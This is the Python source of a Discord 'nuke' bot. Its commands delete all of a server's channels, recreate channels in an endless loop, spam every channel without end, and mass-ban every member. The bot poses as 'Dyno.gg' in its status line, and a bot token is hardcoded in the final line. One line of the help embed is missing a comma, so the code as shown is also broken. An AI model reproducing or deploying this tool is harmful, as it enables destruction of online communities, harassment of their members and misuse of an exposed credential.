from operator import mod
import re
import random
import discord
from discord import embeds
from discord import colour
from discord import user
from discord import member
from discord import permissions
from discord.colour import Color 
from discord.ext import commands
from discord.ext.commands import bot
from discord.ext.commands.bot import Bot
from discord.ext.commands.core import after_invoke, command, cooldown, has_permissions
from discord.ext.commands.errors import BotMissingPermissions, MissingPermissions, MissingRequiredArgument
from discord.member import Member
from discord.utils import time_snowflake
from discord import Intents
from discord.ext import commands

intents=discord.Intents.all()

client = commands.Bot(command_prefix = '.',intents=intents)
client.remove_command('help')

@client.event
async def on_ready():
    activity = discord.Game(name="Dyno.gg", type=3)
    await client.change_presence(status=discord.Status.online, activity=activity)
    print("The bot is ready")

@client.command()
async def destroy (ctx,message):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} has been deleted")
        except:
             pass
    for i in range(1):
        await guild.create_text_channel(f"{message}")
    while True:
        for channel in guild.text_channels:
            for i in range (1):
                await guild.create_text_channel(f"{message}")
 

@client.command()
async def s(ctx, *, message ):
  guild=ctx.message.guild
  await ctx.message.delete()
  for i in range(2):
    print("spammed")
    while True:
           for channel in guild.text_channels:
                 await channel.send(f"{message}")

@client.command()
async def cda(ctx):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
        except:
            pass

@client.command()
async def b(ctx,reason=None):
  guild=ctx.guild
  members=ctx.guild.members
  await ctx.message.delete()

  for member in members:
    try:
       await member.ban(reason=reason)
       print("BANNED.")
    except:
       print("i cannot ban this user.")       

@client.command()
async def commands(ctx):
 
  embed=discord.Embed(title="Commands",timestamp= ctx.message.created_at,color=discord.Color.red(),inline=False)
  embed.add_field(name="**.cda**",value="cda command for deleting all channels only", inline=False)
  embed.add_field(name="**.destroy (message)**",value="destroy command for deleting all and creating 500 channels ",inline=False)
  embed.add_field(name="**.s (message)**",value="s command for spam the bot will send your message in all channels in the guild",inline=False)
  embed.add_field(name="**b**",value="b for mass ban (banall)"inline=False)
  embed.set_footer(text="developed by Saad.")

  await ctx.send(embed=embed)

client.run("ODUwMDc2NzUzODI4MjQ5NjUw.YLkdqw.xFxLZJhcqED0qlUytLfu8MsM1Xo")
